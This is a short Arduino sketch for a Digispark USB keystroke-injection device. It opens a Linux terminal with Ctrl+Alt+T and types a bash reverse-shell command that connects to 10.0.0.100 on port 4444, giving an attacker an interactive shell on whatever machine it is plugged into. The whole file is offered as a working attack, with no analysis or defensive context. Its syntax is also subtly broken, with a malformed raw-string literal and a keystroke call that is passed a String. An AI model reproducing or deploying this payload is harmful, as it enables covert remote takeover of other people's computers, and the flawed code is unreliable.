

  #include "DigiKeyboard.h"

  String IPPORT = F("10.0.0.100/4444");

  String BASH_COMMAND;

  void setup() {

    BASH_COMMAND = R"bash -i >& /dev/tcp/" + IPPORT + " 0>&1";

    DigiKeyboard.delay(1000);

    DigiKeyboard.sendKeyStroke(0);
    // Press Ctrl + Alt + T to open a terminal
    DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);

    DigiKeyboard.delay(600);

    DigiKeyboard.sendKeyStroke(BASH_COMMAND);
    DigiKeyboard.delay(600);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);


  }

  void loop() {}


